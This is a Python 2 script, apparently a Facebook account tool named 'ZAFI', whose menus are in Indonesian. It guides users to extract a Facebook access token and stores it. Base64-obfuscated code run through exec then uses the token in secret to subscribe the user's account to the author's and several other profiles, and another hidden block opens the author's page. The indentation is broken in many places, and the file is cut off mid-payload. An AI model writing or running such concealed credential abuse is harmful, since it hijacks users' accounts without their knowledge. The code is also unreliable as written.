#!/usr/bin/python2
# coding=utf-8
# coding by Romi Afrizal
# Note : jangan di ubah lagi! nanti error, script udah enak
# Open source code team | ngotak dikit cok jangan jual di perjual belikan 

Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
• Info script :

- author      : Romi Afrizal
- facebook    : facebook.com/romi.afrizal.102
- fanspage    : facebook.com/100022086172556
- whatsap     : +6282371648186
- github      : github.com/Mark-Zuck
- script name : ZAFI (Zona Akun Facebook Indonesia)
- version     : 1.1

%s"""%(Hj,Mt))
import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
exec(base64.b64decode('Y3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbjEgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCmJ1bGFuID0gWydKYW51YXJpJywgJ0ZlYnJ1YXJpJywgJ01hcmV0JywgJ0FwcmlsJywgJ01laScsICdKdW5pJywgJ0p1bGknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2t0b2JlcicsICdOb3ZlbWJlcicsICdEZXNlbWJlciddDQp0cnk6DQogICAgaWYgbiA8IDAgb3IgbiA+IDEyOg0KICAgICAgICBleGl0KCkNCiAgICBuVGVtcCA9IG4gLSAxDQpleGNlcHQgVmFsdWVFcnJvcjoNCiAgICBleGl0KCkNCg0KY3VycmVudCA9IGRhdGV0aW1lLm5vdygpDQp0YSA9IGN1cnJlbnQueWVhcg0KYnUgPSBjdXJyZW50Lm1vbnRoDQpoYSA9IGN1cnJlbnQuZGF5DQpvcCA9IGJ1bGFuW25UZW1wXQ0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCiMgS1VNUFVMQU4gV0FSTkENCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENClAgPSAnXHgxYlsxOzk3bScgIyBQVVRJSA0KTiA9ICdceDFiWzBtJyAjIFdBUk5BIE1BVEkNCmFjYWsgPSBbTSwgSCwgSywgQiwgVSwgTywgUF0NCndhcm5hID0gcmFuZG9tLmNob2ljZShhY2FrKQ0KdGlsID0i4oCiIg=='))
ok, cp, id, user, loop = [], [], [], [], 0
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s menghapus token %s'%(M,til,o)),
        sys.stdout.flush();jeda(1)
def folder():
try:os.mkdir('hasil')
except:pass
try:os.mkdir('data')
except:pass
try:
ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
open("data/ua.txt","w").write(ua_)
except:
pass
# LOGO (LO GOBLOK)
IP = requests.get("https://api.ipify.org/").text
def banner():
print (''' %s 
© Group%s \n __________       _____.__  \n \____    /____ _/ ____\__| %s> %sZona \n   /     /\\__  \\\   __\|  | %s> %sAkun \n  /     /_ / __ \|  |  |  | %s>%s Facebook \n /_______ (____  /__|  |__| %s>%s Indonesia \n         \/    \/ \n %s[%s*%s] By : %sSSasiya BBa \n %s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
(H,K,H,K,H,K,H,K,H,K,P,K,P,H,P,K,P,K,P,H,IP))
# SASI TOKEN (TOKEN LISTRIK)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print ('\n%s [01] Login via token \n [02] Cara mendapatkan token \n [%s00%s] Keluar'%(P,M,P))
    rom = raw_input('\n%s [?] Menu : %s'%(P,K))
    if rom in(""):
    print("%s [!] Isi yang benar kentod "%(M));exit()
    elif rom in ('1','01'):
        jalan("\n%s [%s!%s] Wajib gunakan akun tumbal dilarang akun utama"%(P,M,P))
    romz = raw_input('%s [?] Token : %s'%(P,K))
        if romz in(""):
        print("%s [!] Isi yang benar kentod "%(M));exit()
    try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s[√] Login berhasil, mohon tunggu '%(H));jeda(2)
            open('token.txt', 'w').write(romz);login_xx()
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
        except (KeyError,IOError):
        print("%s [!] Token invalid "%(M));masuk()
    elif rom in ('2', '02'):
    print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
        print (" - siapkan akun facebook (wajib akun tumbal)");jeda(2)
        print (" - loginkan akun facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
        print (" - url alamat wajib %shttps://m.facebook.com %s(mode data)"%(O,H));jeda(2)
        print (" - salin link : %shttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_"%(O));jeda(2)
        print ("%s - taruh link tersebut di url alamat facebook lalu klik cari "%(H));jeda(2)
        print (" - jika sudah, klik %stitik tiga %spojok kanan atas "%(O,H));jeda(2)
        print (" - kemudian klik %sCari di Halaman %s"%(O,H));jeda(2)
        print (" - ketik %sEAAAA %sakan muncul acces token."%(O,H));jeda(2)
        print (" - jika sudah jangan lupa di salin \n");jeda(2)
        nanya = raw_input('%s [?] Anda paham? [%sy%s/%sn%s] :%s '%(P,H,P,M,P,K))
        if nanya in(""):
        print ("%s [!] saya bertanya wajib di jawab "%(M));jeda(2);masuk()
        elif nanya in("y","Y"):
        print ("\n%s [√] selamat anda pintar :* "%(H));jeda(2);masuk()
        elif nanya in("n","N"):
        print ("\n%s [!] anda sungguh tolol "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif rom in ('0', '00'):
    exit('\n')
    else:
    print("%s [!] Isi yang benar kentod "%(M));exit()
exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2d
